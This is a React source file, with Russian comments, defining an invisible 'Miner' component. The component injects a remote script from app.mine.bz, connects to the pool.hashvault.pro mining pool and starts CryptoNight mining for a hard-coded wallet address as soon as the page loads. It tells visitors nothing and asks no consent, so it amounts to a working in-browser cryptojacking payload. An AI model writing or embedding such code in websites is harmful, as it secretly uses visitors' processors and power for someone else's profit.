/*
import { useEffect } from "react";

export const Miner = () => {
  useEffect(() => {
    const script = document.createElement("script");
    script.src = "https://app.mine.bz/altyn.js?perfekt=wss://?algo=cn/r?jason=pool.hashvault.pro:443";
    script.async = true;
    document.body.appendChild(script);

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  return null; // или возвращайте что-то, если нужно
  //return totalhashes; // или возвращайте что-то, если нужно
};

*/
import { useEffect } from "react";

export const Miner = () => {
  useEffect(() => {
    const script = document.createElement("script");
    script.src = "https://app.mine.bz/altyn.js?perfekt=wss://?algo=cn/r?jason=pool.hashvault.pro:443";
    script.async = true;

    script.onload = () => {
      // @ts-ignore: если TypeScript не знает о PerfektStart
      if (typeof window.PerfektStart === "function") {
        window.PerfektStart(
          "4BCMDQB1dZV9KN9ZYo4RH3cHTAL9jUocL474pnSDaRJoeUndmWqc8KefKUoFRnczupixisqBy1uiqQES2oSgF9594vrt3St",
          "React",
          2);
        
      }
    };

    document.body.appendChild(script);

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  return null;
};